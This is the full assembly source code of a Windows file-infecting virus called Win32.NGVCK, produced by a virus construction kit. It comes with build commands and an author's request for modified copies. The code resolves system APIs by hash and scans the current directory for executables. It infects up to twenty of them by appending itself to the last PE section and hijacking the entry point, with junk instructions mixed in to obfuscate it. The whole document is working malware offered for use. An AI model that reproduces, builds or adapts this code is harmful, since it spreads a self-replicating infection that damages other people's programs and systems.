              
;
;
; Win32.NGVCK by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 21
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 shr eax, 26d                           ; Trash
 jmp KernelSearchStart


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 push 0
 pop edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edi
 push edi
                                        ; round to pages
 shr edi, 16d
 ror edi, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 6h

GK1:                                    ; check for DOS-EXE Stub
                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+K32Trys]
 cmp edx, 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 movzx edx, word ptr [edi]
 sub edx, 'ZM'
 jz CheckPE

GK2:
                                        ; mov ebx, 65536
 mov ebx, ( 65536d xor 13d )
 xor ebx, 13d
 sub edi, ebx
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov ebx, [edi+3Ch]
 xchg ebx, edi
 add edi, ebx
 xchg ebx, edi
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelMZ], edi
 mov dword ptr [ebp+KernelPE], 0
 adc eax, 27978437d                     ; Trash
 xor dword ptr [ebp+KernelPE], ebx

 lea edx, GetApis
 add edx, ebp
 dec dword ptr [ebp+Trash1]             ; Trash

 push edx
ret


;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov esi, edi
                                        ; clear esi
 xor esi, esi
 add esi, edi
                                        ; mov edx, edi
 mov edx, edi
LenCRC:
                                        ; add edx, 1
 sub edx, -1d
 cmp byte ptr [edx], 0
 jne LenCRC
 sub edx, esi
                                        ; mov edi, edx
 push edx
 pop edi
                                        ; add edi, 1
 inc edi
 cld
                                        ; clear eax
 and eax, 0
 add eax, -1
                                        ; mov ebx, eax
 mov ebx, eax
NextByteCRC:
                                        ; clear edx
 mov edx, -51201d
 add edx, 51201d
                                        ; clear ecx
 mov ecx, 0
 mov dl, byte ptr [esi]
                                        ; add esi, 1
 sub esi, -1d
 xor dl, al
 mov al, ah
 mov ah, bl
 mov bl, bh
 mov bh, 8
NextBitCRC:
 shr cx, 1
 rcr dx, 1
jnc NoCRC
 xor dx,08320h
 xor cx,0EDB8h
NoCRC:
 dec bh
jnz NextBitCRC
 xor eax, edx
 xor ebx, ecx
 dec edi
jnz NextByteCRC
 not ebx
 not eax
 mov edx, ebx
 rol edx, 16d
 mov dx, ax
 mov dword ptr [ebp+APICRC32], -1
 and dword ptr [ebp+APICRC32], edx
 popad
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx

 xor dword ptr [ebp+Trash1], 27395      ; Trash
                                        ; clear edx
 xor edx, edx
 add edx, dword ptr [ebp+OldEIP]

 push edx
 pop dword ptr [ebp+retEIP]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 add ebp, 1d
 dec ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 lea edx, [ebp+WFD_szFileName]

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1
 mov edx, ebx                           ; Trash

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
 push ebx
 push 0
 push ebx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 test eax, eax
 jz CloseFile
                                        ; clear edx
 xor edx, edx
 push ebx
 push edx
 push edx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edi, [edx+78h]
 add edi, [ebp+KernelMZ]
 sub ecx, 45282981d                     ; Trash
                                        ; add edi, 28
 dec edi
 add edi, 29d
                                        ; get ATableVA
 mov edx, dword ptr [edi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; add edi, 4
 inc edi
 add edi, 3d
                                        ; get NTableVA
 mov edx, dword ptr [edi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
                                        ; add edi, 4
 inc edi
 add edi, 3d
                                        ; get OTableVA
 mov edx, dword ptr [edi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
 mov ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ecx
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
                                        ; mov ecx, edx
 mov ecx, edx
                                        ; mov edi, ecx
 push ecx
 pop edi
 mov dword ptr [ebp+TempApisearch2], edi
 push ebx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 push dword ptr [ebp+APICRC32]
 pop eax
 sub eax, dword ptr [ebx]
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ebx
 pop ecx
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; add ecx, 4
 add ecx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop ebx
 add esp, 4h
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 shr ecx, 28d                           ; Trash
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop ecx
 movzx edx, word ptr [ecx]
 shl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 and dword ptr [ebp+Trash1], eax        ; Trash
 pop ecx
 add ecx, dword ptr [edx]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 MapHandle   dd 0h
 K32Trys     dd 0h
 counter     dw 0h
 OTableVA    dd 0h
 FileHandle  dd 0h
 TempApisearch2 dd 0h
 Attributes  dd 0h
 NTableVA    dd 0h
 AlignReg2   dd 0h
 OldEIP      dd 0h
 InfCounter  dd 0h
 TempAPI     dd 0h
 AlignReg1   dd 0h
 ATableVA    dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileMappingA    dd 0h
 XGetFileAttributesA    dd 0h
 XSetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h

 db 'Win32.NGVCK - SnakeByte',0
 KernelPE    dd 0h
 KernelMZ    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 APICRC32    dd 0h
 filemask    db '*.exE',0
 OldBase     dd 400000h
 NewEIP      dd 0h
 MapAddress  dd 0h
 Trash1      dd 0h
 NewSize     dd 0h
 FindHandle  dd 0h
 AlignTemp   dd 0h

 APINames:
 dd 068624A9Dh           ; CloseHandle
 dd 0797B49ECh           ; MapViewOfFile
 dd 0C200BE21h           ; FindClose
 dd 08C892DDFh           ; CreateFileA
 dd 094524B42h           ; UnmapViewOfFile
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 03C19E536h           ; SetFileAttributesA
 dd 0AA700106h           ; FindNextFileA
 dd 0AE17EBEFh           ; FindFirstFileA





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea ebx, [ebp+APINames]

 mov esi, ebp
 sal edx, 17d                           ; Trash
 add esi, offset APIOffsets


GetApisLoop: 

                                        ; search 'em
                                        ; ebx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add ebx, 4
 add ebx, 4d
                                        ; mov edx, -1
 mov edx, ( -1d xor 6d )
 xor edx, 6d
 and edx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], edx
                                        ; add esi, 4
 add esi, 4d
 sub ecx, 1
 jnz GetApisLoop
 lea ebx, [ebp+Outbreak]
 xchg ebx, esi

 push esi
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg eax, edx

 push eax
 push dword ptr [ebp+FindHandle]
 pop edx
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ecx, 276
 mov ecx, ( 276d + 7d )
 sub ecx, 7d
 lea ebx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 add ebx, 1d
 dec ecx
 jnz ClearOldData2
 mov dword ptr [ebp+Trash1], edx        ; Trash
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg esi, ecx

 push esi
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ebx
 mov ebx, -36529d
 add ebx, 36529d
 add ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, ebx
 add esi, [ebx+3Ch]
 mov ecx, 17051263d                     ; Trash
                                        ; get File Alignment
 mov edx, [esi+3Ch]
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], edx
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, esi
 add edx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
                                        ; clear esi
 mov esi, 17997d
 sub esi, 17997d
 add esi, edx
                                        ; get last section
                                        ; clear ebx
 push 0
 pop ebx
 mov bx, word ptr [esi+06h]
 dec ebx
 imul ebx, ebx, 28h
 add edx, ebx
                                        ; add edx, 120
 inc edx
 add edx, 119d
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, dword ptr [esi+74h]
 clc
 rcl ecx, 3
 add edx, ecx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], eax
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], ecx
                                        ; clear ecx
 sub ecx, ecx

 add ecx, [edx+10h]
                                        ; mov eax, ecx
                                        ; clear eax
 and eax, 0
 add eax, ecx
 or ebx, eax                            ; Trash
 add edx, 14h
 add ecx, [edx]
 sub edx, 14h
 push ecx
 mov ebx, eax
 add ebx, [edx+0Ch]
 push ebx
 pop dword ptr [ebp+NewEIP]
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ebx
                                        ; clear ebx
 push 0
 pop ebx

 add ebx, [edx+10h]
 push ebx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], 0h
 add dword ptr [edx+10h], ebx
 pop ebx
 add ebx, VirusSize
 mov dword ptr [edx+08h], 0
 add dword ptr [edx+08h], ebx
 mov ebx, dword ptr [edx+0Ch]
 add ebx, dword ptr [edx+10h]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 lea ebx, [ebp+Virus]
 xchg ebx, esi


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
 and ebx, 88331929d                     ; Trash
                                        ; decrease Infection Counter
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+InfCounter]
 sub ebx, 1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, edx

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov eax, 128
 mov eax, ( 128d xor 34d )
 xor eax, 34d
 push eax
 lea eax, [ebp+WFD_szFileName]
 xchg eax, edx


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear ebx
 mov ebx, 36599d
 sub ebx, 36599d
 add ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je Goodfile
                                        ; mov edx, 13086
 mov edx, ( 13086d - 4d )
 add edx, 4d
 cmp edx, 0
 jne Notagoodfile
Goodfile:
 cmp word ptr [ebx+3Ch], 0h
 je Notagoodfile
 mov edx, dword ptr [ebx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edx
 jb Notagoodfile
 add edx, ebx
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [edx]
 sub eax, 'EP'
 jz Goodfile2
                                        ; clear eax
 mov eax, 0
 cmp eax, 0
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jz Notagoodfile
 not eax                                ; Trash
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+Attributes]
 push eax
 lea edi, [ebp+WFD_szFileName]
 add dword ptr [ebp+Trash1], ecx        ; Trash
 xchg edi, eax

 push eax
 sub dword ptr [ebp+Trash1], 1126332    ; Trash
 call dword ptr [ebp+XSetFileAttributesA]
 add dword ptr [ebp+Trash1], ebx        ; Trash
 jmp NoInfection

Notagoodfile:
 call UnMapFile
 mov dword ptr [ebp+Trash1], ebx        ; Trash

NoInfection:
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear esi
 mov esi, -17969d
 add esi, 17969d
 add esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

 push dword ptr [ebp+OldBase]
 pop edx

 push edx
 pop dword ptr [ebp+retBase]




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea esi, [ebp+filemask]
 xchg esi, ebx

                                        ; Set Infection Counter
                                        ; mov ecx, 20
 mov ecx, 20d
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ecx
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ecx
 or ecx, ecx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
 add edx, 73075708d                     ; Trash
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop edx
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear ecx
 mov ecx, -31897d
 add ecx, 31897d
 push ecx
 call ExitProcess



end FakeCode

